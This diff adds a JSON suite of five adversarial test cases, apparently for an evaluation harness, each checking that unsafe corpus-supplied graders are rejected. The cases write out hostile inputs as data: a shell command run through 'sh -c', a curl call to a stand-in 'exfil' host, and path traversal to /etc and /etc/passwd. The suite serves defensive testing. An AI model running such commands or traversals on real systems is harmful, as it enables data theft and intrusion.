@@ -1,0 +1,124 @@
+[
+  {
+    "version": 1,
+    "id": "UNSAFE-001",
+    "kind": "execution",
+    "category": "adversarial",
+    "prompt": "A corpus-supplied grader that tries to execute an arbitrary command.\n",
+    "expected": {
+      "outcome": {
+        "assertions": [
+          "the case is rejected as an unsafe grader definition, not run",
+          "/tmp/skill-engineer-unsafe-sentinel is never created"
+        ]
+      }
+    },
+    "graders": [
+      {
+        "type": "deterministic",
+        "check": {
+          "command": ["sh", "-c", "touch /tmp/skill-engineer-unsafe-sentinel"],
+          "expect_exit": 0
+        }
+      }
+    ],
+    "tags": ["security", "must-be-rejected"]
+  },
+  {
+    "version": 1,
+    "id": "UNSAFE-002",
+    "kind": "execution",
+    "category": "adversarial",
+    "prompt": "A grader whose target escapes the package via path traversal.\n",
+    "expected": {
+      "outcome": {
+        "assertions": [
+          "the traversal target is rejected before any filesystem access"
+        ]
+      }
+    },
+    "graders": [
+      {
+        "type": "deterministic",
+        "check": {
+          "kind": "inspect",
+          "target": "../../../../etc",
+          "expect_exit": 0
+        }
+      }
+    ],
+    "tags": ["security", "must-be-rejected"]
+  },
+  {
+    "version": 1,
+    "id": "UNSAFE-003",
+    "kind": "execution",
+    "category": "adversarial",
+    "prompt": "A grader that names a network utility as its check command.\n",
+    "expected": {
+      "outcome": {
+        "assertions": [
+          "no network utility is reachable from a corpus-supplied grader"
+        ]
+      }
+    },
+    "graders": [
+      {
+        "type": "deterministic",
+        "check": {
+          "command": ["curl", "-s", "https://example.invalid/exfil"]
+        }
+      }
+    ],
+    "tags": ["security", "must-be-rejected"]
+  },
+  {
+    "version": 1,
+    "id": "UNSAFE-004",
+    "kind": "execution",
+    "category": "adversarial",
+    "prompt": "A grader naming a check kind that no trusted runner implements.\n",
+    "expected": {
+      "outcome": {
+        "assertions": [
+          "an unknown check kind fails validation rather than being skipped silently"
+        ]
+      }
+    },
+    "graders": [
+      {
+        "type": "deterministic",
+        "check": {
+          "kind": "shell",
+          "target": "evals"
+        }
+      }
+    ],
+    "tags": ["security", "must-be-rejected"]
+  },
+  {
+    "version": 1,
+    "id": "UNSAFE-005",
+    "kind": "execution",
+    "category": "adversarial",
+    "prompt": "A fixture path pointing outside the case directory.\n",
+    "expected": {
+      "outcome": {
+        "assertions": [
+          "fixture paths may not escape the case directory"
+        ]
+      }
+    },
+    "fixtures": ["../../../../etc/passwd"],
+    "graders": [
+      {
+        "type": "deterministic",
+        "check": {
+          "kind": "file-exists",
+          "path": "SKILL.md"
+        }
+      }
+    ],
+    "tags": ["security", "must-be-rejected"]
+  }
+]
